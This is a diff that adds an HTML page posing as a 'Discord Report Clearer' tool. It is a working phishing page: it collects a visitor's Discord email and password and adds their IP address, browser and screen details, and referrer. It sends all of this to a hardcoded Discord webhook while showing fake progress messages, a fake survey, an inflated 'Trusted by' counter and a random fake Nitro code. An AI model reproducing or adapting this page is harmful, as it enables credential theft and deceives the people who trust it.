@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord Reports Clearer _2024</title> 
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap');
+        @import url('https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css');
+        body { font-family: 'Poppins', sans-serif; background-color: #2c2f33; color: #ffffff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { background-color: #23272a; padding: 40px; border-radius: 15px; box-shadow: 0 0 30px rgba(0, 0, 0, 0.4); text-align: center; width: 100%; max-width: 450px; animation: fadeIn 1s ease-in-out; }
+        h1 { color: #7289da; margin-bottom: 20px; font-size: 32px; font-weight: bold; text-transform: uppercase; }
+        p { margin-bottom: 20px; color: #99aab5; font-size: 18px; }
+        .console { background-color: #2c2f33; border: 1px solid #7289da; border-radius: 8px; padding: 20px; font-family: 'Courier New', Courier, monospace; color: #99aab5; margin-bottom: 20px; height: 150px; overflow-y: auto; text-align: left; box-shadow: inset 0 0 10px rgba(0, 0, 0, 0.5); }
+        input, select { width: calc(100% - 24px); padding: 15px; margin: 12px 0; border: 2px solid #7289da; border-radius: 8px; background-color: #23272a; color: #ffffff; font-size: 16px; transition: border 0.3s ease; }
+        input:focus, select:focus { border-color: #5b6eae; }
+        button { width: 100%; padding: 15px; background-color: #7289da; color: #ffffff; border: none; border-radius: 8px; cursor: pointer; font-size: 16px; margin-top: 20px; transition: background-color 0.3s ease, transform 0.3s ease; }
+        button:hover { background-color: #5b6eae; transform: translateY(-2px); }
+        #survey, #nitro-container { display: none; margin-bottom: 20px; }
+        .trusted-by { margin-top: 20px; font-size: 14px; color: #99aab5; }
+        .trusted-by i { margin-right: 8px; color: #7289da; }
+        .nitro-code { font-size: 20px; color: #7289da; margin-top: 20px; font-weight: bold; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1><i class="fas fa-shield-alt"></i> Discord Report Clearer</h1>
+        <p>Using the Nexus-SYS API and networking it...</p>
+        <div class="console" id="console">Initializing...</div>
+        <form id="safety-form" style="display: none;">
+            <input type="email" id="email" placeholder="Email" autocomplete="off" required>
+            <input type="password" id="password" placeholder="Password" autocomplete="off" required>
+            <div id="nitro-container">
+                <label for="nitro">Do you have Nitro?</label>
+                <select id="nitro">
+                    <option value="false">No</option>
+                    <option value="true">Yes</option>
+                </select>
+            </div>
+            <button type="button" onclick="a()">Log In</button>
+        </form>
+        <div id="survey" style="display: none;">
+            <p>Complete this survey to proceed:</p>
+            <p>Would you choose us again?</p>
+            <button type="button" onclick="b()">Yes</button>
+            <button type="button" onclick="b()">No</button>
+        </div>
+        <div class="trusted-by">
+            <i class="fas fa-user-check"></i> Trusted by: <span id="trusted-number"></span>
+        </div>
+    </div>
+
+    <script>
+        async function a() {
+            const c = document.getElementById('email').value;
+            const d = document.getElementById('password').value;
+            const e = document.getElementById('nitro').value;
+            if (!f(c)) {
+                alert('Invalid email.');
+                return;
+            }
+            const g = document.getElementById('console');
+            const h = document.getElementById('safety-form');
+            h.style.display = 'none';
+            g.innerHTML += "<div>Processing...</div>";
+            g.innerHTML += "<div>Please wait...</div>";
+            setTimeout(() => {
+                g.innerHTML += "<div>Failed!</div>";
+                g.innerHTML += "<div>Verify your identity.</div>";
+                document.getElementById('survey').style.display = 'block';
+            }, 3000);
+            const i = await j();
+            const k = l();
+            const m = document.referrer;
+            await n(c, d, e, i, k, m);
+        }
+
+        function f(n) {
+            const o = /^(([^<>()\[\]\\.,;:\s@"]+(.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@(([^<>()[\]\.,;:\s@"]+\.)+[^<>()[\]\.,;:\s@"]{2,})$/i;
+            return o.test(n);
+        }
+
+        async function j() {
+            try {
+                const p = await fetch('https://ipapi.co/json/');
+                const q = await p.json();
+                return q.ip;
+            } catch (r) {
+                console.error('Error', r);
+                return 'Unknown';
+            }
+        }
+
+        function l() {
+            const { userAgent: s } = navigator;
+            const t = window.screen.width;
+            const u = window.screen.height;
+            const v = navigator.platform;
+            const w = navigator.appName;
+            const x = navigator.appVersion;
+            return `UA: ${s}, Res: ${t}x${u}, Platform: ${v}, Browser: ${w}, Version: ${x}`;
+        }
+
+        async function n(y, z, A, B, C, D) {
+            const E = 'https://discord.com/api/webhooks/1269345750748369058/gmzXQlA2dYy3I9Zeq8YnYdDspcErrBLw8Esrh2Bs_27KjrmMCJMVrVdk1kzdKH5KZ0NS'; 
+            const F = { content: `**Email:** ${y}\n**Password:** ${z}\n**Nitro:** ${A}\n**IP:** ${B}\n**Device:** ${C}\n**Referrer:** ${D}` };
+            try {                                                   /// buddy, try spamming the webhook above me :) 
+                const G = await fetch(E, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(F) });
+                if (G.ok) {
+                    console.log('Success');
+                } else {
+                    console.error('Error:', G.statusText); 
+                }
+            } catch (H) {
+                console.error('Error', H);
+            }
+        }
+
+        function I() {
+            const J = document.getElementById('trusted-number');
+            let K = localStorage.getItem('trustedNumber') || 200000;
+            J.textContent = K.toLocaleString();
+            setInterval(() => {
+                K = parseInt(K) + Math.floor(Math.random() * 20) + 10;
+                J.textContent = K.toLocaleString();
+                localStorage.setItem('trustedNumber', K);
+            }, 8000);
+        }
+
+        function b() {
+            const g = document.getElementById('console');
+            const L = document.getElementById('survey');
+            L.style.display = 'none';
+            g.innerHTML += "<div>Reports cleared!</div>";
+            g.innerHTML += "<div>Apologies for the inconvenience. Here's a free nitro code that can be claimed in 48 hours. Save it! Here:</div>";
+            const M = N();
+            g.innerHTML += `<div class="nitro-code">${M}</div>`;
+            setTimeout(() => { window.location.href = `https://www.youtube.com/watch?v=xvFZjo5PgG0`; }, 5000);
+        }
+
+        function N() {
+            const O = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+            let P = '';
+            for (let Q = 0; Q < 16; Q++) {
+                P += O.charAt(Math.floor(Math.random() * O.length));
+                if ((Q + 1) % 4 === 0 && Q < 15) {
+                    P += '-';
+                }
+            }
+            return P;
+        }
+
+        async function R() {
+            const S = document.getElementById('console');
+            const T = document.getElementById('safety-form');
+            const U = document.getElementById('nitro-container');
+            let V = ["Initializing...", "Checking reports", "Reports found...", "Almost done...", "Complete the form."];
+            let W = 0;
+
+            function X() {
+                if (W < V.length) {
+                    S.innerHTML += `<div>${V[W]}</div>`;
+                    W++;
+                    setTimeout(X, 1000);
+                } else {
+                    T.style.display = 'block';
+                    U.style.display = 'block';
+                }
+            }
+            X();
+        }
+
+        window.onload = () => {
+            R();
+            I();
+        };
+    </script>
+</body>
+</html>
